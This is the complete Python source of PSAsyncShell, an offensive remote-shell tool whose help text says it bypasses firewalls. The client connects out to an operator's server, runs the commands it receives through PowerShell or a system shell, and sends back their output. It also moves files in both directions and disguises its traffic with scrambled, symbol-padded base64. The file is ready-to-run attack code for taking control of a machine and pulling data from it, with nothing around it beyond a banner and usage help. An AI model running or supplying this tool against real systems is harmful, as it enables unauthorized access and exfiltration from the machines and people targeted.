#!/usr/bin/env python3
#==============================#
#  PSAsyncShell by @JoelGMSec  #
#     https://darkbyte.net     #
#==============================#

import sys
import socket
import threading
import time
import os
import random
import base64
import subprocess
import readline
from sys import argv
from datetime import datetime
from neotermcolor import colored

# Banner
def show_banner():
    print(colored(r"""
  ____  ____    _                         ____  _          _ _  
 |  _ \/ ___|  / \   ___ _   _ _ __   ___/ ___|| |__   ___| | | 
 | |_) \___ \ / _ \ / __| | | | '_ \ / __\___ \| '_ \ / _ \ | | 
 |  __/ ___) / ___ \\__ \ |_| | | | | (__ ___) | | | |  __/ | | 
 |_|   |____/_/   \_\___/\__, |_| |_|\___|____/|_| |_|\___|_|_| 
                         |___/                                  
""", "blue"))
    print()
    print(colored("  ---------------------- by @JoelGMSec -----------------------  ", "green"))
    print()

# Help
def show_help():
    print(colored(" Info: ", "yellow", attrs=["bold"]) + colored(" This tool helps you to get a remote shell", "white"))
    print(colored("        over asynchronous TCP to bypass firewalls", "white"))
    print()
    print(colored(" Usage: ", "yellow", attrs=["bold"]) + colored(".\\PSAsyncShell.py -s -p listen_port", "blue"))
    print(colored("          Listen for a new connection from the client", "green"))
    print()
    print(colored("        ", "white") + colored(".\\PSAsyncShell.py -c server_ip server_port", "blue"))
    print(colored("          Connect the client to a PSAsyncShell server", "green"))
    print()
    print(colored(" Warning: ", "red", attrs=["bold"]) + colored("All data will be sent unencrypted", "white"))
    print(colored("          Upload function doesn't use MultiPart", "white"))
    print()

# Variables
OS_VERSION = sys.platform
START = True
DATA_COUNT = 1
REMOTE_PATH = os.path.expanduser("~")
DEBUG = False
LOCAL_SLASH = "\\" if OS_VERSION == "win32" else "/"
SYMBOLS = '..........$.}.{.>.<.*.%.;.:./.(.).@.~.=.].[.!.?.^.&.#.|.........'
UPLOAD = False
DOWNLOAD = False
MULTI = False
MULTI_DOWN = False
MULTI_DATA = ""
PS_EXIT = False
REMOTE_SLASH = "/"
CHUNK_SIZE = None
WAIT_SECONDS = 0

# Functions
def wait_for_download(seconds):
    wait_count = seconds + 1
    cursor_pos = get_cursor_position()
    
    while wait_count > 0:
        if wait_count != 0:
            print(colored(f"WAITING: {wait_count}", "yellow"), end='', flush=True)
            wait_count -= 1
        
        set_cursor_position(cursor_pos)
        print("                              ", end='', flush=True)
        set_cursor_position(cursor_pos)
        print(colored(f"WAITING: {wait_count}", "yellow"), end='', flush=True)
        time.sleep(1)
    
    set_cursor_position(cursor_pos)
    print("                              ", end='', flush=True)
    set_cursor_position(cursor_pos)
    print("", end='', flush=True)

def get_cursor_position():
    return 0

def set_cursor_position(pos):
    pass

def get_chunk(text, chunk_size):
    chunks = []
    i = 0
    while i <= len(text) - chunk_size:
        chunks.append(text[i:i+chunk_size])
        i += chunk_size
    if i < len(text):
        chunks.append(text[i:])
    return chunks

def send_chunk(ip, port, data, debug=False):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, port))
        if debug:
            chunk_data = replace_symbols(data)
            chunk_data = chunk_data.replace(",", "")
            print(colored(f"MULTIOUT: {chunk_data}", "white"))
        sock.sendall((data + "\n").encode('ascii'))
        sock.close()
    except Exception as e:
        if debug:
            print(colored(f"Error in send_chunk: {e}", "red"))
        time.sleep(0.5)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sock.sendall((data + "\n").encode('ascii'))
            sock.close()
        except Exception as e2:
            if debug:
                print(colored(f"Retry failed: {e2}", "red"))

def replace_symbols(text):
    for symbol in SYMBOLS:
        text = text.replace(symbol, ",")
    return text

def r64_encoder(mode, data, file_path=None):
    if mode == "-t":
        base64_data = base64.b64encode(data.encode('utf-8')).decode('ascii')
    elif mode == "-f":
        with open(data, 'rb') as f:
            base64_data = base64.b64encode(f.read()).decode('ascii')
    
    base64_data = base64_data.split("=")[0]
    base64_data = base64_data.replace("+", "-")
    base64_data = base64_data.replace("/", "_")
    
    rev_b64 = list(base64_data)
    rev_b64.reverse()
    r64_base = ''.join(rev_b64)
    
    # Add random symbols
    result = ""
    chunk_size = random.randint(2, 3)
    chunks = [r64_base[i:i+chunk_size] for i in range(0, len(r64_base), chunk_size)]
    
    for chunk in chunks:
        dots = "." * random.randint(1, 6)
        random_index1 = random.randint(0, len(SYMBOLS) - 1)
        random_index2 = random.randint(0, len(SYMBOLS) - 1)
        result += dots + SYMBOLS[random_index1] + chunk + SYMBOLS[random_index2]
    
    return result

def r64_decoder(mode, data, file_path=None):
    # Reverse the encoding process
    base64_data = list(data)
    base64_data.reverse()
    base64_data = ''.join(base64_data)
    
    base64_data = replace_symbols(base64_data)
    base64_data = base64_data.replace(",", "")
    base64_data = base64_data.replace("-", "+")
    base64_data = base64_data.replace("_", "/")
    
    # Add padding if needed
    padding = len(base64_data) % 4
    if padding == 2:
        base64_data += "=="
    elif padding == 3:
        base64_data += "="
    
    if mode == "-t":
        try:
            decoded = base64.b64decode(base64_data).decode('utf-8')
            return decoded
        except Exception as e:
            if DEBUG:
                print(colored(f"Decode error: {e}", "red"))
            return ""
    elif mode == "-f":
        try:
            decoded = base64.b64decode(base64_data)
            with open(file_path, 'wb') as f:
                f.write(decoded)
        except Exception as e:
            if DEBUG:
                print(colored(f"File decode error: {e}", "red"))

def execute_command(cmd):
    try:
        if OS_VERSION == "win32":
            result = subprocess.run(["powershell", "-Command", cmd], 
                                  capture_output=True, text=True, shell=True)
        else:
            result = subprocess.run(cmd, shell=True, 
                                  capture_output=True, text=True)
        
        if result.stdout:
            return result.stdout
        elif result.stderr:
            return result.stderr
        else:
            return ""
    except Exception as e:
        return f"Error executing command: {e}"

def server_mode(ip, port):
    global START, DATA_COUNT, REMOTE_PATH, UPLOAD, DOWNLOAD, MULTI, MULTI_DOWN, MULTI_DATA, PS_EXIT, REMOTE_SLASH
    silent = ("-silent" in argv)
    if not silent:
        show_banner()
        print(colored("[+] Waiting for new connection..\n", "yellow"))
    
    # Create socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server_socket.bind((ip, port))
        server_socket.listen(1)
    except Exception as e:
        print(colored(f"[!] Error starting server: {e}", "red"))
        return
    
    while True:
        try:
            client_socket, client_address = server_socket.accept()
            
            if START:
                command = r64_encoder("-t", "[+] PSAsyncShell OK!")
            elif UPLOAD:
                command_decoded = r64_decoder("-t", command)
                downfile = command_decoded.split()[1]
                command = r64_encoder("-f", downfile)
                UPLOAD = False
            elif MULTI:
                command = r64_encoder("-t", "[+] MultiPart Data OK!")
            else:
                path = REMOTE_PATH.replace("\n", "").replace("\r", "")
                while True:
                    try:
                        cmd_input = input(colored(f"[PSAsyncShell] {path}> ", "blue"))
                    except EOFError:
                        cmd_input = "exit"
                    
                    command = cmd_input
                    
                    if command == "session":
                        command = "Get-Process | Format-Table -AutoSize"
                    elif command == "pwd":
                        if not path:
                            START = True
                            print()
                    
                    if command.startswith("upload"):
                        UPLOAD = True
                        parts = command.split()
                        if len(parts) >= 3:
                            upfile = parts[2]
                            if not command.startswith("upload " + REMOTE_SLASH):
                                command = f"upload {parts[1]} {path}{REMOTE_SLASH}{upfile}"
                        else:
                            print(colored("[!] Usage: upload local_file remote_file", "red"))
                            command = None
                    
                    elif command.startswith("download"):
                        DOWNLOAD = True
                        parts = command.split()
                        if len(parts) >= 3:
                            downfile = parts[2]
                            if not command.startswith("download " + REMOTE_SLASH):
                                command = f"download {path}{REMOTE_SLASH}{parts[1]} {downfile}"
                        else:
                            print(colored("[!] Usage: download remote_file local_file", "red"))
                            command = None
                    
                    elif command in ["cls", "clear"]:
                        os.system('cls' if OS_VERSION == 'win32' else 'clear')
                        command = None
                    elif command == "cd .":
                        command = None
                    elif command == "cd ..":
                        path = os.path.dirname(path)
                        command = f"Set-Location {path}"
                        print()
                    elif command.startswith("cd "):
                        REMOTE_PATH = ' '.join(command.split()[1:])
                        print()
                        if REMOTE_SLASH in command:
                            command = f"Set-Location '{REMOTE_PATH}'"
                            path = REMOTE_PATH
                        else:
                            path = path + REMOTE_SLASH + ' '.join(command.split()[1:])
                            command = f"Set-Location '{path}'"
                    
                    if OS_VERSION == "win32" and REMOTE_SLASH == "/":
                        path = path.replace("\\", "/")
                    elif OS_VERSION != "win32" and REMOTE_SLASH == "\\":
                        path = path.replace("/", "\\")
                    
                    if command == "exit":
                        PS_EXIT = True
                    
                    if command is not None:
                        break
                    else:
                        print()
                
                if command:
                    command = r64_encoder("-t", command)
            
            REMOTE_PATH = REMOTE_PATH.replace("'", "").replace('"', "")
            
            if DEBUG:
                print(colored(f"CMD: {command}", "white"))
            
            client_socket.sendall(command.encode('ascii'))
            client_socket.close()
            
            if DOWNLOAD:
                if "-wait" in argv:
                    wait_for_download(WAIT_SECONDS)
                    MULTI = True
                    DOWNLOAD = False
                    print(colored("[+] Receiving MultiPart Data..", "yellow"), end='', flush=True)
                    MULTI_DOWN = True
            
            # Receive response
            time.sleep(0.5)
            
            if PS_EXIT:
                print(colored("[!] Exiting!\n", "red"))
                break
            
            server_socket.listen(1)
            client_socket, client_address = server_socket.accept()
            
            data = client_socket.recv(4096).decode('ascii').strip()
            
            if DEBUG:
                print(colored(f"DATA: {data}", "white"))
            
            if START:
                path = r64_decoder("-t", data)
                START = False
                data = None
                if "\\" in path:
                    REMOTE_SLASH = "\\"
                else:
                    REMOTE_SLASH = "/"
            
            elif DOWNLOAD:
                if r64_decoder("-t", data) == "[+] Sending MultiPart Data..":
                    data = None
                    print(colored("[+] Receiving MultiPart Data..", "yellow"), end='', flush=True)
                    MULTI = True
                    DOWNLOAD = False
                    MULTI_DOWN = True
                else:
                    r64_decoder("-f", data, downfile)
                    data = f"[+] File downloaded on {os.getcwd()}{LOCAL_SLASH}{downfile}!\n"
                    DOWNLOAD = False
            
            elif MULTI:
                if r64_decoder("-t", data) == "[+] MultiPart Data OK!":
                    if MULTI_DOWN:
                        MULTI = False
                        r64_decoder("-f", MULTI_DATA, downfile)
                        data = f"[+] File downloaded on {os.getcwd()}{LOCAL_SLASH}{downfile}!\n"
                        MULTI_DOWN = False
                        DATA_COUNT = 1
                        MULTI_DATA = ""
                        print("\n")
                    else:
                        MULTI = False
                        data = r64_decoder("-t", MULTI_DATA)
                        MULTI_DATA = ""
                        print("\n")
                else:
                    cursor_pos = get_cursor_position()
                    MULTI_DATA += data
                    data = None
                    print(colored(".", "yellow"), end='', flush=True)
                    DATA_COUNT += 1
                    if DATA_COUNT == 8:
                        DATA_COUNT = 1
                        set_cursor_position(cursor_pos)
                        print("                                          ", end='', flush=True)
                        set_cursor_position(cursor_pos)
                        print(colored("[+] Receiving MultiPart Data..", "yellow"), end='', flush=True)
            
            else:
                if data is not None:
                    data = r64_decoder("-t", data)
            
            if not data and not MULTI:
                print()
            
            if data == "[+] Ready to upload!":
                data = None
            elif data == "[+] File uploaded!":
                data = f"[+] File uploaded on {path}{REMOTE_SLASH}{upfile}!\n"
            elif data == "[+] Sending MultiPart Data..":
                data = None
                MULTI = True
                print(colored("[+] Receiving MultiPart Data..", "yellow"), end='', flush=True)
            
            if data:
                if '[+]' in data:
                    print(colored(data, "green"))
                else:
                    print(colored(data, "yellow"))
            
            client_socket.close()
            
        except Exception as e:
            if DEBUG:
                print(colored(f"Server error: {e}", "red"))
            continue
    
    server_socket.close()

def client_mode(ip, port):
    global START, UPLOAD, DOWNLOAD, MULTI, MULTI_DATA, CHUNK_SIZE
    
    while True:
        cmd = None
        output = None
        
        # Client data object simulation
        client_data = {
            'Current': '*',
            'ClientID': ''.join(random.choices('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', k=12)),
            'ComputerName': os.environ.get('COMPUTERNAME', 'unknown').lower(),
            'UserName': os.environ.get('USERNAME', 'unknown').lower()
        }
        
        time.sleep(0.5)
        
        try:
            # Receive command from server
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            client_data['Address'] = sock.getsockname()[0]
            
            data = sock.recv(4096).decode('ascii').strip()
            
            if UPLOAD:
                r64_decoder("-f", data, downfile)
            else:
                cmd = r64_decoder("-t", data)
            
            if cmd == "[+] PSAsyncShell OK!":
                START = True
            
            if DEBUG:
                print(colored(f"CMD: {cmd}", "white"))
            
            sock.close()
            
            # Process command and send response
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            
            if cmd and cmd.startswith("download"):
                output = r64_encoder("-f", cmd.split()[1])
            elif cmd and cmd.startswith("upload"):
                downfile = cmd.split()[2]
                output = r64_encoder("-t", "[+] Ready to upload!")
                UPLOAD = True
            elif UPLOAD:
                output = r64_encoder("-t", "[+] File uploaded!")
                UPLOAD = False
            elif START:
                output = r64_encoder("-t", os.getcwd())
                START = False
            elif MULTI:
                chunks = get_chunk(MULTI_DATA, CHUNK_SIZE)
                for chunk in chunks:
                    time.sleep(1.2)
                    send_chunk(ip, port, chunk, DEBUG)
                    send_chunk(ip, port, chunk, DEBUG)
                MULTI = "SendOut"
            elif MULTI == "SendOut":
                output = r64_encoder("-t", "[+] MultiPart Data OK!")
                MULTI = False
                MULTI_DATA = ""
            else:
                if cmd:
                    result = execute_command(cmd)
                    if result:
                        output = r64_encoder("-t", result)
                    else:
                        output = r64_encoder("-t", os.getcwd())
                else:
                    output = r64_encoder("-t", os.getcwd())
            
            if CHUNK_SIZE and output and len(output) >= CHUNK_SIZE:
                MULTI_DATA = output
                MULTI = True
                output = r64_encoder("-t", "[+] Sending MultiPart Data..")
            
            if DEBUG and not MULTI:
                decoded_out = r64_decoder('-t', output)
                print(colored(f"OUT: {decoded_out}", "white"))
            
            sock.sendall(output.encode('ascii'))
            sock.close()
            
        except Exception as e:
            if DEBUG:
                print(colored(f"Client error: {e}", "red"))
            time.sleep(1)
            continue

def main():
    global DEBUG, CHUNK_SIZE, WAIT_SECONDS
    
    if len(argv) < 2:
        show_banner()
        show_help()
        print(colored("[!] Not enough parameters!", "red"))
        return
    
    if argv[1] in ["-h", "-help", "--help"]:
        show_banner()
        show_help()
        return
    
    if len(argv) < 3:
        show_banner()
        show_help()
        print(colored("[!] Not enough parameters!", "red"))
        return
    
    # Parse arguments
    ip = "0.0.0.0"
    port = 0
    
    if argv[1] == "-s":
        if "-p" in argv:
            p_index = argv.index("-p")
            if p_index + 1 < len(argv):
                port = int(argv[p_index + 1])
        else:
            port = int(argv[2])
    elif argv[1] == "-c":
        ip = argv[2]
        port = int(argv[3])
    
    # Parse additional options
    if "-debug" in argv:
        DEBUG = True
    
    if "-wait" in argv:
        wait_index = argv.index("-wait")
        if wait_index + 1 < len(argv):
            WAIT_SECONDS = int(argv[wait_index + 1])
    
    # Set chunk size if provided
    if len(argv) > 4 and argv[4].isdigit():
        CHUNK_SIZE = int(argv[4])
    
    # Start appropriate mode
    if argv[1] == "-s":
        server_mode(ip, port)
    elif argv[1] == "-c":
        client_mode(ip, port)

if __name__ == "__main__":
    main()
